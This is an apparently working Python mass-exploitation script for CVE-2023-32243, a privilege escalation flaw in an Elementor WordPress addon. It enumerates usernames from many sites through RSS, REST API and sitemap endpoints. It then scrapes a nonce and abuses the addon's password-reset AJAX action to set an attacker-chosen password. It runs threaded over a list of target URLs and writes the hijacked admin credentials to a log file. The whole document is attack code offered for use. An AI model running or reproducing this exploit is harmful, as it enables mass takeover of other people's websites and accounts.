import argparse
import requests, json
import re
import os
from threading import *
from threading import Thread
from queue import Queue
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from bs4 import BeautifulSoup


class Worker(Thread):
  def __init__(self, tasks):
      Thread.__init__(self)
      self.tasks = tasks
      self.daemon = True
      self.start()

  def run(self):
      while True:
          func, args, kargs = self.tasks.get()
          try: func(*args, **kargs)
          except Exception as e: print(e)
          self.tasks.task_done()

class ThreadPool:
  def __init__(self, num_threads):
      self.tasks = Queue(num_threads)
      for _ in range(num_threads): Worker(self.tasks)

  def add_task(self, func, *args, **kargs):
      self.tasks.put((func, args, kargs))

  def wait_completion(self):
      self.tasks.join()
session = requests.Session()




def extract_usernames(wordpress_url):

    rss_usernames = extract_usernames_rss(wordpress_url)
    rest_api_usernames = get_usernames_rest_api(wordpress_url)
    sitemap_usernames = get_usernames_sitemap(wordpress_url)
    rest_api2_usernames = scrape_users_via_rest_api(wordpress_url)
    all_usernames = list(set(rss_usernames) | set(rest_api_usernames) | set(sitemap_usernames)| set(rest_api2_usernames))
    return all_usernames



# Method 1: Using WordPress RSS feed
def extract_usernames_rss(wordpress_url):
    headers = {'User-Agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'}
    response = session.get(f"{wordpress_url}/feed/",headers=headers,verify=False)
    if response.status_code == 200:
       soup = BeautifulSoup(response.text, "xml")
       try:
          all_usernames = []
          for item in soup.find_all("item"):
              creator = item.find("dc:creator")
              if creator and creator.text:
                 all_usernames.append(creator.text)
          return all_usernames
       except Exception as e:
          print(f"{wordpress_url} Failed to fetch usernames using RSS Feed. Error: {e} ")
          return []
    else:
       print(f"{wordpress_url} Failed to fetch usernames using RSS Feed. Error: /feed/")
       return []


# Method 2: Using WordPress REST API
def get_usernames_rest_api(wordpress_url):
    headers = {'User-Agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'}
    api_url = wordpress_url + '/wp-json/wp/v2/users'
    response = session.get(api_url, headers=headers, verify=False)
    if response.status_code == 200:
        users = response.json()
        usernames = [user['slug'] for user in users]
        return usernames
    else:
        print(f"{wordpress_url} Failed to fetch usernames using REST API. Error:/wp-json/wp/v2/users")
        return []

# Method 3: Using WordPress Yoast Authors Sitemap         
def get_usernames_sitemap(wordpress_url):
    headers = {'User-Agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'}
    response = session.get(f"{wordpress_url}/author-sitemap.xml", headers=headers, verify=False)
    if response.status_code == 200:
       soup = BeautifulSoup(response.text, "xml")
       usernames = set()
       for loc in soup.find_all("loc"):
           match = re.search(r"/author/([^/]+)/?$", loc.text.strip())
           if match:
              usernames.add(match.group(1))
       return usernames
    else:
       print(f"{wordpress_url} Failed to fetch usernames using author-sitemap.xml. Error http status code "+str(response.status_code)+"")
       return[]
       
# Method 4: Using the Wordpress Rest API
def scrape_users_via_rest_api(wordpress_url):
    try:
        headers = {'User-Agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'}
        api_url = f"{wordpress_url}/?rest_route=/wp/v2/users"
        response = requests.get(api_url, headers=headers, verify=False)
        if response.status_code == 200:
            users = response.json()
            usernames = [user['slug'] for user in users]
            return usernames
        else:
            print(f"{wordpress_url} Failed to fetch usernames using REST Route API. Error: ?rest_route=/wp/v2/users")
            return []
    except Exception as e:
        print("Error occurred while scraping users:", str(e))
        return []
        
def select_username(usernames):
    if not usernames:
       print("Sorry, unable to help. No usernames found.")
       exit()

    print("Please select a username:")
    for i, username in enumerate(usernames):
        print(f"{i+1}. {username}")
    index = int(input("> ")) - 1
    return list(usernames)[index]

def extract_nonce(wordpress_url):
    try:
        url = f"{wordpress_url}/"
        headers = {'User-Agent': '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'}
        response = session.get(url, headers=headers, verify=False)
        soup = BeautifulSoup(response.text, "lxml")
        script_tag = soup.find("script", string=lambda t: "var localize" in str(t))
        script_text = script_tag.text.strip() if script_tag else ""
        nonce_start_index = script_text.find('"nonce":"') + 9
        nonce_end_index = script_text.find('"', nonce_start_index)
        return script_text[nonce_start_index:nonce_end_index]
    except Exception as e:
        print("Sorry, not able to help.")
        exit()

def send_request(wordpress_url, nonce, user, password):
    url = f"{wordpress_url}/wp-admin/admin-ajax.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    payload = {
        "action": "login_or_register_user",
        "eael-resetpassword-submit": "true",
        "page_id": "124",
        "widget_id": "224",
        "eael-resetpassword-nonce": nonce,
        "eael-pass1": password,
        "eael-pass2": password,
        "rp_login": user
    }

    response = session.post(url, headers=headers, data=payload, verify=False)

    if 'success":true' in response.text:
            print(wordpress_url +"All Set! You can now login using the following credentials:")
            print("Username: ", user)
            peler = f"""
Username : {user}
Password : {password}
Login : {wordpress_url}/wp-admin/
"""
            print("Password: ",password)
            print("Admin Url: "+wordpress_url+"/wp-admin/")
            open(f"resLog.txt", "a").write(peler + "\n")

    elif 'success":false' in response.text:

        alasan = json.loads(response.text)["data"]
        if alasan:
            print(f"failed to change credentials : {wordpress_url} > {alasan}")
    else:   
        print(wordpress_url + " unknown error")
        return


def ReadLists(file, user , password, threads):
        if not threads: 
           
            sites = open(file, encoding="utf8" ).read().splitlines()
            for site in sites:
                runner(site, user , password)
        else : 
            Pool = ThreadPool(int(threads))
            sites = open(file, encoding="utf8" ).read().splitlines()
            for site in sites:
                Pool.add_task(runner, site, user , password)
            Pool.wait_completion()

def runner(web , user, password):
    if user is None:
        try:
           all_usernames = extract_usernames(web)
        except Exception as e:
           print(f"{web} Error extracting usernames")
           return
        if not all_usernames: 
            print(web + " cant find username")
            return
        print(f"{web} > {all_usernames}")
      
        selected_username = list(all_usernames)[0]
    else:
        selected_username = user

    nonce = extract_nonce(web)
    if not nonce:
        print("Sorry, not able to extract the nonce")
        return
    print(f"Nonce value: {nonce}")
    print(f"Username value: {selected_username}")

    send_request(web, nonce, selected_username, password)

if __name__ == "__main__":
    text = """
CVE-2023-32243
Title : Mass Exploit & Checker Elementor privesc 0day
Exploit type : privilege-escalation
Affected : 1 million +
"""

    lines = text.splitlines()

    for line in lines:
        print("\033[41m\033[1;37m" + line + "\033[0m")


    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--lists", required=True, help="List of url of the WordPress site")
    parser.add_argument("-t", "--thread", help="set the thread ( default is no )")
    parser.add_argument("-p", "--password", required=True, help="Password to set for the selected username")
    parser.add_argument("-usr", "--username", required=False, help="Username of the user to reset if you already know it. ( not available mass )")
    args = parser.parse_args()

    ReadLists(args.lists, args.username , args.password , args.thread )

   